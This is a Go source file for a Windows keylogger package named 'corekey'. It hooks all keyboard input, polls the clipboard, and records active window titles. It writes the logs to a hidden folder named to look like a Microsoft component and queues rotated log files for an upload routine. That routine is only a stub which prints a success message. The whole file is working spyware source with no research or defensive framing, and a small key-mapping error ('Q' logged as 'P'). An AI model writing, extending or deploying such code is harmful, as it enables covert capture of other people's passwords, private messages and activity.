package corekey

import (
    "fmt"
    "log"
    "os"
    "os/user"
    "strconv"
    "strings"
    "syscall"
    "time"
    "unsafe"

    "github.com/TheTitanrain/w32"
    "github.com/atotto/clipboard"
    "golang.org/x/sys/windows"
)

//未按shift
var keys_low = map[uint16]string{
    8:   "[Back]",
    9:   "[Tab]",
    10:  "[Shift]",
    13:  "[Enter]\r\n",
    14:  "",
    15:  "",
    16:  "",
    17:  "[Ctrl]",
    18:  "[Alt]",
    19:  "",
    20:  "", //CAPS LOCK
    27:  "[Esc]",
    32:  " ", //SPACE
    33:  "[PageUp]",
    34:  "[PageDown]",
    35:  "[End]",
    36:  "[Home]",
    37:  "[Left]",
    38:  "[Up]",
    39:  "[Right]",
    40:  "[Down]",
    41:  "[Select]",
    42:  "[Print]",
    43:  "[Execute]",
    44:  "[PrintScreen]",
    45:  "[Insert]",
    46:  "[Delete]",
    47:  "[Help]",
    48:  "0",
    49:  "1",
    50:  "2",
    51:  "3",
    52:  "4",
    53:  "5",
    54:  "6",
    55:  "7",
    56:  "8",
    57:  "9",
    65:  "a",
    66:  "b",
    67:  "c",
    68:  "d",
    69:  "e",
    70:  "f",
    71:  "g",
    72:  "h",
    73:  "i",
    74:  "j",
    75:  "k",
    76:  "l",
    77:  "m",
    78:  "n",
    79:  "o",
    80:  "p",
    81:  "q",
    82:  "r",
    83:  "s",
    84:  "t",
    85:  "u",
    86:  "v",
    87:  "w",
    88:  "x",
    89:  "y",
    90:  "z",
    91:  "[Windows]",
    92:  "[Windows]",
    93:  "[Applications]",
    94:  "",
    95:  "[Sleep]",
    96:  "0",
    97:  "1",
    98:  "2",
    99:  "3",
    100: "4",
    101: "5",
    102: "6",
    103: "7",
    104: "8",
    105: "9",
    106: "*",
    107: "+",
    108: "[Separator]",
    109: "-",
    110: ".",
    111: "[Divide]",
    112: "[F1]",
    113: "[F2]",
    114: "[F3]",
    115: "[F4]",
    116: "[F5]",
    117: "[F6]",
    118: "[F7]",
    119: "[F8]",
    120: "[F9]",
    121: "[F10]",
    122: "[F11]",
    123: "[F12]",
    144: "[NumLock]",
    145: "[ScrollLock]",
    160: "", //LShift
    161: "", //RShift
    162: "[Ctrl]",
    163: "[Ctrl]",
    164: "[Alt]", //LeftMenu
    165: "[RightMenu]",
    186: ";",
    187: "=",
    188: ",",
    189: "-",
    190: ".",
    191: "/",
    192: "`",
    219: "[",
    220: "\\",
    221: "]",
    222: "'",
    223: "!",
}

//SHIFT
var keys_high = map[uint16]string{
    8:   "[Back]",
    9:   "[Tab]",
    10:  "[Shift]",
    13:  "[Enter]\r\n",
    17:  "[Ctrl]",
    18:  "[Alt]",
    20:  "", //CAPS LOCK
    27:  "[Esc]",
    32:  " ", //SPACE
    33:  "[PageUp]",
    34:  "[PageDown]",
    35:  "[End]",
    36:  "[Home]",
    37:  "[Left]",
    38:  "[Up]",
    39:  "[Right]",
    40:  "[Down]",
    41:  "[Select]",
    42:  "[Print]",
    43:  "[Execute]",
    44:  "[PrintScreen]",
    45:  "[Insert]",
    46:  "[Delete]",
    47:  "[Help]",
    48:  ")",
    49:  "!",
    50:  "@",
    51:  "#",
    52:  "$",
    53:  "%",
    54:  "^",
    55:  "&",
    56:  "*",
    57:  "(",
    65:  "A",
    66:  "B",
    67:  "C",
    68:  "D",
    69:  "E",
    70:  "F",
    71:  "G",
    72:  "H",
    73:  "I",
    74:  "J",
    75:  "K",
    76:  "L",
    77:  "M",
    78:  "N",
    79:  "O",
    80:  "P",
    81:  "Q",
    82:  "R",
    83:  "S",
    84:  "T",
    85:  "U",
    86:  "V",
    87:  "W",
    88:  "X",
    89:  "Y",
    90:  "Z",
    91:  "[Windows]",
    92:  "[Windows]",
    93:  "[Applications]",
    94:  "",
    95:  "[Sleep]",
    96:  "0",
    97:  "1",
    98:  "2",
    99:  "3",
    100: "4",
    101: "5",
    102: "6",
    103: "7",
    104: "8",
    105: "9",
    106: "*",
    107: "+",
    108: "[Separator]",
    109: "-",
    110: ".",
    111: "[Divide]",
    112: "[F1]",
    113: "[F2]",
    114: "[F3]",
    115: "[F4]",
    116: "[F5]",
    117: "[F6]",
    118: "[F7]",
    119: "[F8]",
    120: "[F9]",
    121: "[F10]",
    122: "[F11]",
    123: "[F12]",
    144: "[NumLock]",
    145: "[ScrollLock]",
    160: "", //LShift
    161: "", //RShift
    162: "[Ctrl]",
    163: "[Ctrl]",
    164: "[Alt]", //LeftMenu
    165: "[RightMenu]",
    186: ":",
    187: "+",
    188: "<",
    189: "_",
    190: ">",
    191: "?",
    192: "~",
    219: "°",
    220: "|",
    221: "}",
    222: "\"",
    223: "!",
}

//大小写
var capup = map[uint16]string{
    8:   "[Back]",
    9:   "[Tab]",
    10:  "[Shift]",
    13:  "[Enter]\r\n",
    14:  "",
    15:  "",
    16:  "",
    17:  "[Ctrl]",
    18:  "[Alt]",
    19:  "",
    20:  "", //CAPS LOCK
    27:  "[Esc]",
    32:  " ", //SPACE
    33:  "[PageUp]",
    34:  "[PageDown]",
    35:  "[End]",
    36:  "[Home]",
    37:  "[Left]",
    38:  "[Up]",
    39:  "[Right]",
    40:  "[Down]",
    41:  "[Select]",
    42:  "[Print]",
    43:  "[Execute]",
    44:  "[PrintScreen]",
    45:  "[Insert]",
    46:  "[Delete]",
    47:  "[Help]",
    48:  "0",
    49:  "1",
    50:  "2",
    51:  "3",
    52:  "4",
    53:  "5",
    54:  "6",
    55:  "7",
    56:  "8",
    57:  "9",
    65:  "A",
    66:  "B",
    67:  "C",
    68:  "D",
    69:  "E",
    70:  "F",
    71:  "G",
    72:  "H",
    73:  "I",
    74:  "J",
    75:  "K",
    76:  "L",
    77:  "M",
    78:  "N",
    79:  "O",
    80:  "P",
    81:  "P",
    82:  "R",
    83:  "S",
    84:  "T",
    85:  "U",
    86:  "V",
    87:  "W",
    88:  "X",
    89:  "Y",
    90:  "Z",
    91:  "[Windows]",
    92:  "[Windows]",
    93:  "[Applications]",
    94:  "",
    95:  "[Sleep]",
    96:  "0",
    97:  "1",
    98:  "2",
    99:  "3",
    100: "4",
    101: "5",
    102: "6",
    103: "7",
    104: "8",
    105: "9",
    106: "*",
    107: "+",
    108: "[Separator]",
    109: "-",
    110: ".",
    111: "[Divide]",
    112: "[F1]",
    113: "[F2]",
    114: "[F3]",
    115: "[F4]",
    116: "[F5]",
    117: "[F6]",
    118: "[F7]",
    119: "[F8]",
    120: "[F9]",
    121: "[F10]",
    122: "[F11]",
    123: "[F12]",
    144: "[NumLock]",
    145: "[ScrollLock]",
    160: "", //LShift
    161: "", //RShift
    162: "[Ctrl]",
    163: "[Ctrl]",
    164: "[Alt]", //LeftMenu
    165: "[RightMenu]",
    186: ";",
    187: "=",
    188: ",",
    189: "-",
    190: ".",
    191: "/",
    192: "`",
    219: "[",
    220: "\\",
    221: "]",
    222: "'",
    223: "!",
}

var (
    user32                  = windows.NewLazySystemDLL("user32.dll")
    procSetWindowsHookEx    = user32.NewProc("SetWindowsHookExW")
    procCallNextHookEx      = user32.NewProc("CallNextHookEx")
    procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
    procGetMessage          = user32.NewProc("GetMessageW")
    procGetKeyState         = user32.NewProc("GetKeyState")
    procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
    procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
    procGetWindowTextW      = user32.NewProc("GetWindowTextW")
    keyboardHook            HHOOK
    vowelMin                string = "aeiou"
    vowelMaj                string = "AEIOU"
    writer                  Writer
)

const (
    WH_KEYBOARD_LL = 13
    WM_KEYDOWN     = 256
    tempFilePath   = "\\AppData\\Local\\Packages\\Microsoft.Messaging\\"
)

type LoggerConfig struct {
    fileRule    func() string
    tmpKeylog   string
    currentFile string
    strChan     chan string
    upFileChan  chan string
    MaskFlag    int8
    Savefile    func(l *LoggerConfig, str, file string)
    UpFile      func(path, file string)
}

type (
    DWORD     uint32
    WPARAM    uintptr
    LPARAM    uintptr
    LRESULT   uintptr
    HANDLE    uintptr
    HINSTANCE HANDLE
    HHOOK     HANDLE
    HWND      HANDLE
)

type HOOKPROC func(int, WPARAM, LPARAM) LRESULT

type KBDLLHOOKSTRUCT struct {
    VkCode      DWORD
    ScanCode    DWORD
    Flags       DWORD
    Time        DWORD
    DwExtraInfo uintptr
}

type POINT struct {
    X, Y int32
}

type MSG struct {
    Hwnd    HWND
    Message uint32
    WParam  uintptr
    LParam  uintptr
    Time    uint32
    Pt      POINT
}

func CreateKeylogFile(path string) {
    file, err := os.Create(path)
    if err != nil {
        log.Fatal("Cannot create file", err)
    }
    defer file.Close()
    writer.file = file
}

type Writer struct {
    file *os.File
}

func SetWindowsHookEx(idHook int, lpfn HOOKPROC, hMod HINSTANCE, dwThreadId DWORD) HHOOK {
    ret, _, _ := procSetWindowsHookEx.Call(
        uintptr(idHook),
        uintptr(syscall.NewCallback(lpfn)),
        uintptr(hMod),
        uintptr(dwThreadId),
    )
    return HHOOK(ret)
}

func CallNextHookEx(hhk HHOOK, nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
    ret, _, _ := procCallNextHookEx.Call(
        uintptr(hhk),
        uintptr(nCode),
        uintptr(wParam),
        uintptr(lParam),
    )
    return LRESULT(ret)
}

func UnhookWindowsHookEx(hhk HHOOK) bool {
    ret, _, _ := procUnhookWindowsHookEx.Call(
        uintptr(hhk),
    )
    return ret != 0
}

func GetMessage(msg *MSG, hwnd HWND, msgFilterMin uint32, msgFilterMax uint32) int {
    ret, _, _ := procGetMessage.Call(
        uintptr(unsafe.Pointer(msg)),
        uintptr(hwnd),
        uintptr(msgFilterMin),
        uintptr(msgFilterMax))
    return int(ret)
}

func getForegroundWindow() (hwnd syscall.Handle, err error) {
    r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
    if e1 != 0 {
        err = error(e1)
        return
    }
    hwnd = syscall.Handle(r0)
    return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
    r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
    len = int32(r0)
    if len == 0 {
        if e1 != 0 {
            err = error(e1)
        } else {
            err = syscall.EINVAL
        }
    }
    return
}

func (l *LoggerConfig) WindowLogger() {
    var tmpTitle string
    for {
        g, _ := getForegroundWindow()
        b := make([]uint16, 200)
        _, err := getWindowText(g, &b[0], int32(len(b)))
        if err != nil {
            log.Printf("getWindowText err:%v\n", err)
        }
        if syscall.UTF16ToString(b) != "" {
            if tmpTitle != syscall.UTF16ToString(b) {
                tmpTitle = syscall.UTF16ToString(b)
                l.strChan <- string("\r\n[" + tmpTitle + "]\r\n")
            }
        }

        time.Sleep(1 * time.Millisecond)
    }
}

func (l *LoggerConfig) Keylogger() {
    var msg MSG
    CAPS, _, _ := procGetKeyState.Call(uintptr(w32.VK_CAPITAL))
    CAPS = CAPS & 0x000001
    var CAPS2 uintptr
    var SHIFT uintptr
    //var precLog string = ""
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)(func(nCode int, wparam WPARAM, lparam LPARAM) LRESULT {
        if nCode == 0 && wparam == WM_KEYDOWN {
            SHIFT, _, _ = procGetAsyncKeyState.Call(uintptr(w32.VK_SHIFT))
            if SHIFT == 32769 || SHIFT == 32768 {
                SHIFT = 1
            }
            kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
            code := byte(kbdstruct.VkCode)
            if code == w32.VK_CAPITAL {
                if CAPS == 1 {
                    CAPS = 0
                } else {
                    CAPS = 1
                }
            }
            if SHIFT == 1 {
                CAPS2 = 1
            } else {
                CAPS2 = 0
            }
            //未按shift
            if CAPS == 0 && CAPS2 == 0 {
                l.strChan <- keys_low[uint16(code)]
            } else if CAPS2 == 1 {
                l.strChan <- keys_high[uint16(code)]
            } else {
                l.strChan <- capup[uint16(code)]
            }

        }

        return CallNextHookEx(keyboardHook, nCode, wparam, lparam)
    }), 0, 0)

    for GetMessage(&msg, 0, 0, 0) != 0 {
        time.Sleep(1 * time.Millisecond)
    }

    UnhookWindowsHookEx(keyboardHook)
    keyboardHook = 0
}

func (l *LoggerConfig) ClipboardLogger() {
    text, _ := clipboard.ReadAll()
    for {
        text1, _ := clipboard.ReadAll()
        if text1 != "" && text1 != text {
            l.strChan <- string("\r\n[Clipboard: " + text1 + "]\r\n")
            text = text1
        }
        time.Sleep(200 * time.Millisecond)
    }
}

//实现延时写入文件 并加入时间戳
func GetAppDataPath() string {
    usr, err := user.Current()
    if err != nil {
        log.Fatal(err)
    }
    app := usr.HomeDir + tempFilePath
    app = strings.Replace(app, "\\", "/", -1)
    return app
}

func isExist(filename string) bool {
    _, err := os.Stat(filename)
    return err == nil
}

func upfile(dir, file string) {
    now := strconv.FormatInt(time.Now().Unix(), 10)
    myobject := now + ".log"
    fmt.Println(time.Unix(time.Now().Unix(), 0).Format("2006-01-02 15:04:05") + ": upload " + dir + file + ">>>" + myobject + " succeeded")
}

func savefile(l *LoggerConfig, str, file string) {
    l.UploadCurrentIfNew(file)
    dir := GetAppDataPath()
    if !isExist(dir) {
        err := os.MkdirAll(dir, 0777)
        if err != nil {
            log.Fatal("cannot create directory")
        }
    }

    f, err := os.OpenFile(dir+file, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0644)
    if err != nil {
        log.Fatalf("file open error : %v", err)
    }
    defer f.Close()
    log.SetOutput(f)
    log.Println(str)
    time.Sleep(20 * time.Millisecond)
}

func (l *LoggerConfig) UploadCurrentIfNew(file string) {
    if l.currentFile != file {
        if l.currentFile != "" {
            l.upFileChan <- l.currentFile
        }
        l.currentFile = file
    }
}

func (l *LoggerConfig) Upload() {
    for filePath := range l.upFileChan {
        dir := GetAppDataPath()
        l.UpFile(dir, filePath)
    }
}

func (l *LoggerConfig) UploadQuick() {
    l.upFileChan <- l.currentFile
}

func (l *LoggerConfig) WriteFile() {
    t := time.NewTicker(time.Second)
    for {
        select {
        case str := <-l.strChan:
            l.tmpKeylog += str
        case <-t.C:
            if len(l.tmpKeylog) > 0 {
                l.Savefile(l, l.tmpKeylog, l.fileRule())
                l.tmpKeylog = ""
            }
        }
    }
}

func getFileInfo(fileMode string) func() string {
    var rate int64
    var mode []byte
    for _, v := range fileMode {
        if v >= '0' && v <= '9' {
            rate = rate*10 + int64(v-'0')
            mode = append(mode, byte(v))
        } else if rate > 0 {
            break
        }
    }

    if rate <= 0 {
        rate = 1
    }

    extra := time.Now().Unix() % rate

    return func() string {
        fileFlag := strconv.FormatInt((time.Now().Unix()-extra)/rate, 10)
        return strings.Replace(fileMode, string(mode), fileFlag, -1)
    }
}

func PcListen(fileMode string, shieldMask int8) {
    l := &LoggerConfig{
        fileRule:    getFileInfo(fileMode),
        tmpKeylog:   "",
        currentFile: "",
        UpFile:      upfile,
        Savefile:    savefile,
        MaskFlag:    shieldMask,
        strChan:     make(chan string, 1<<6),
        upFileChan:  make(chan string, 1<<3),
    }
    if l.MaskFlag&1 == 0 {
        go l.ClipboardLogger()
    }

    if l.MaskFlag>>1&1 == 0 {
        go l.WindowLogger()
    }
    if l.MaskFlag>>2&1 == 0 {
        go l.Upload()
    }
    if l.MaskFlag>>3&1 == 0 {
        go l.WriteFile()
    }
    if l.MaskFlag>>4&1 == 0 {
        go l.Keylogger()
    }

}
